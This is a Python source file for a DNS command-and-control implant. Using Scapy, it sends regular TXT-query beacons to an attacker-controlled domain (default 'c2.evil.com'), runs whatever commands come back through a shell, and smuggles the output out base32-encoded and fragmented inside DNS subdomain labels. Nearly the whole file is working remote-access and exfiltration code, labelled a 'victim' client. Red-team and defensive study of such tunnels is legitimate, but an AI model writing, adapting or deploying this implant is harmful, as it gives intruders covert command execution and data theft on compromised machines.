"""
DNS C2 Client
"""
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import sr1
import subprocess
import time
import logging
import hashlib
import sys
import argparse
import base64

# Suppress Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Configuration - can be overridden via command line
DNS_SERVER = None  # Optional: specific DNS server IP (if not using system resolver)
BEACON_INTERVAL = 3  # seconds between beacons
MAX_SUBDOMAIN_LENGTH = 63  # Max subdomain length per RFC 1035
MAX_QUERY_LENGTH = 253  # Max total domain name length
BASE_DOMAIN = "c2.evil.com"  # MUST be a real domain you control
seq_num = 0
last_output = "BEACON_INIT"  # Initial beacon message
output_queue = []  # Queue of fragments to send


def encode_data(data):
    """Encode data for DNS subdomain (base32 for DNS-safe characters)"""
    encoded = base64.b32encode(data.encode()).decode().lower()
    return encoded.rstrip("=")


def decode_data(encoded):
    """Decode data from DNS subdomain"""
    # Add padding back
    padding = (8 - len(encoded) % 8) % 8
    encoded = encoded.upper() + "=" * padding
    try:
        return base64.b32decode(encoded).decode()
    except Exception:
        return encoded  # Return as-is if decoding fails


def fragment_output(data, fragment_id):
    """Fragment large output into chunks suitable for DNS queries"""
    global output_queue

    # Encode data first
    encoded_data = encode_data(data)

    # First pass: estimate total fragments with worst-case overhead
    # Format: FRAG-<id>-<n>-<total>-<checksum>.<encoded_data>.c2.local
    # Worst case: FRAG-999-999-999-12345678. = ~30 chars + domain
    max_overhead = 30 + len(f".{BASE_DOMAIN}")
    initial_chunk_size = MAX_QUERY_LENGTH - max_overhead

    if initial_chunk_size < 20:
        initial_chunk_size = 20

    estimated_total = (len(encoded_data) + initial_chunk_size - 1) // initial_chunk_size

    # Second pass: calculate actual overhead based on estimated total
    # Use the estimated total for both current and total in overhead calculation
    # Account for DNS label limit of 63 chars - each 63-char chunk needs a dot
    protocol_overhead = len(
        f"FRAG-{fragment_id}-{estimated_total}-{estimated_total}-12345678."
    )
    domain_overhead = len(f".{BASE_DOMAIN}")

    # Calculate how many dots we need for 63-char labels
    # For chunk_size of N, we need ceil(N/63)-1 dots
    # Estimate conservatively: assume we need dots for worst case
    max_chunk_for_length = MAX_QUERY_LENGTH - protocol_overhead - domain_overhead
    dots_needed = max(0, (max_chunk_for_length + 62) // 63 - 1)  # ceil(N/63)-1

    overhead = protocol_overhead + domain_overhead + dots_needed
    chunk_size = MAX_QUERY_LENGTH - overhead

    if chunk_size < 20:  # Safety check
        chunk_size = 20

    # Calculate final total fragments
    total_fragments = (len(encoded_data) + chunk_size - 1) // chunk_size

    # If total changed significantly, recalculate one more time to be safe
    if abs(total_fragments - estimated_total) > 5:
        overhead = len(
            f"FRAG-{fragment_id}-{total_fragments}-{total_fragments}-12345678."
        ) + len(f".{BASE_DOMAIN}")
        chunk_size = MAX_QUERY_LENGTH - overhead
        if chunk_size < 20:
            chunk_size = 20
        total_fragments = (len(encoded_data) + chunk_size - 1) // chunk_size
    checksum = hashlib.md5(data.encode()).hexdigest()[:8]

    output_queue = []
    for i in range(total_fragments):
        chunk = encoded_data[i * chunk_size : (i + 1) * chunk_size]

        # DNS labels are limited to 63 chars, so split chunk into multiple labels
        labels = []
        for j in range(0, len(chunk), 63):
            labels.append(chunk[j : j + 63])

        # Format: FRAG-id-current-total-checksum.label1.label2.label3.domain
        label_str = ".".join(labels)
        fragment = f"FRAG-{fragment_id}-{i + 1}-{total_fragments}-{checksum}.{label_str}.{BASE_DOMAIN}"
        output_queue.append(fragment)

    print(f"[*] Fragmented into {total_fragments} DNS queries")


def handle_command(cmd):
    """Execute command and return result"""
    global last_output, output_queue, seq_num

    if cmd.lower() in ["exit", "quit"]:
        print("[!] Received exit command")
        sys.exit(0)

    try:
        result = subprocess.check_output(
            cmd, shell=True, stderr=subprocess.STDOUT, timeout=30
        )
        output = result.decode(errors="ignore").strip()
    except subprocess.TimeoutExpired:
        output = "[!] Command timed out after 30 seconds"
    except Exception as e:
        output = f"[!] Error: {str(e)}"

    print(f"[*] Command output: {len(output)} bytes")

    # Fragment if needed
    if len(output) > 100:  # DNS queries should be small
        fragment_output(output, seq_num)
    else:
        # Small output - single query
        encoded = encode_data(output)
        output_queue = [f"SINGLE.{encoded}.{BASE_DOMAIN}"]

    # Status update will happen after fragments are sent
    return output


def send_beacon_and_wait():
    """Send DNS query beacon and wait for DNS response"""
    global seq_num, last_output, output_queue

    # Record start time to enforce beacon interval
    start_time = time.time()

    print(f"[*] Sending DNS beacon #{seq_num} to {BASE_DOMAIN}")

    # Resolve DNS server if not specified (use Google DNS for proper NS delegation)
    dns_server_ip = DNS_SERVER
    if not dns_server_ip:
        # IMPORTANT: Use public DNS (8.8.8.8) so NS delegation works
        # System resolver (127.0.0.53) won't work for C2 DNS tunneling
        dns_server_ip = "8.8.8.8"

    # Determine what to send in this beacon
    if output_queue:
        # Send next fragment from queue
        query_domain = output_queue.pop(0)
        print(f"[*] Sending fragment ({len(output_queue)} remaining in queue)")
        # Update status for next beacon
        if output_queue:
            last_output = f"READY-fragments-{len(output_queue)}.{BASE_DOMAIN}"
        else:
            last_output = f"READY-idle.{BASE_DOMAIN}"
    else:
        # Send status beacon
        # Encode status message
        if last_output.startswith("READY"):
            query_domain = last_output
        else:
            encoded_status = encode_data(last_output)
            query_domain = f"STATUS.{encoded_status}.{BASE_DOMAIN}"

    # Create DNS query - send to DNS server (which should be attacker's NS)
    # Query for TXT records (type=16) where commands are stored
    dns_query = (
        IP(dst=dns_server_ip)
        / UDP(dport=53)
        / DNS(rd=1, qd=DNSQR(qname=query_domain, qtype="TXT"))
    )

    # Send query and receive response (sr1 = send/receive 1 packet)
    pkt = sr1(dns_query, timeout=BEACON_INTERVAL, verbose=False)
    seq_num += 1

    # Process reply if received
    if pkt and pkt.haslayer(DNS) and pkt[DNS].ancount > 0:
        # Extract TXT record from DNS response
        for i in range(pkt[DNS].ancount):
            rr = pkt[DNS].an[i]
            if rr.type == 16:  # TXT record
                txt_data = rr.rdata
                if isinstance(txt_data, bytes):
                    cmd = txt_data.decode(errors="ignore").strip()
                elif isinstance(txt_data, list):
                    cmd = b"".join(txt_data).decode(errors="ignore").strip()
                else:
                    cmd = str(txt_data).strip()

                if cmd and cmd != "NOOP":
                    print(f"[+] Command received: {cmd}")
                    handle_command(cmd)
                elif cmd == "NOOP":
                    print("[*] No command (NOOP)")
                break
    elif pkt and pkt.haslayer(DNS):
        print("[*] DNS response with no answers")
    else:
        print("[*] No DNS response received (timeout)")

    # Enforce minimum beacon interval
    elapsed = time.time() - start_time
    if elapsed < BEACON_INTERVAL:
        sleep_time = BEACON_INTERVAL - elapsed
        print(f"[*] Waiting {sleep_time:.1f}s to maintain beacon interval...")
        time.sleep(sleep_time)


def main():
    """Main beacon loop"""
    global DNS_SERVER, BEACON_INTERVAL, BASE_DOMAIN

    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description="DNS C2 Victim - Beacon via DNS tunnel"
    )
    parser.add_argument(
        "-d",
        "--domain",
        required=True,
        help="Base domain for C2 (must be owned by attacker)",
    )
    parser.add_argument(
        "-i",
        "--interval",
        type=int,
        default=3,
        help="Beacon interval in seconds (default: 3)",
    )
    parser.add_argument(
        "-s",
        "--server",
        help="Specific DNS server IP (optional, uses system resolver if not specified)",
    )
    args = parser.parse_args()

    BASE_DOMAIN = args.domain
    BEACON_INTERVAL = args.interval
    DNS_SERVER = args.server

    print("[*] DNS C2 Victim started")
    print(f"[*] Target domain: {BASE_DOMAIN}")
    if DNS_SERVER:
        print(f"[*] DNS server: {DNS_SERVER}")
    else:
        print("[*] Using system DNS resolver")
    print(f"[*] Beacon interval: {BEACON_INTERVAL}s")
    print("[*] Waiting for commands via DNS TXT responses...")

    while True:
        try:
            send_beacon_and_wait()
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            import traceback

            traceback.print_exc()
            time.sleep(BEACON_INTERVAL)


if __name__ == "__main__":
    main()
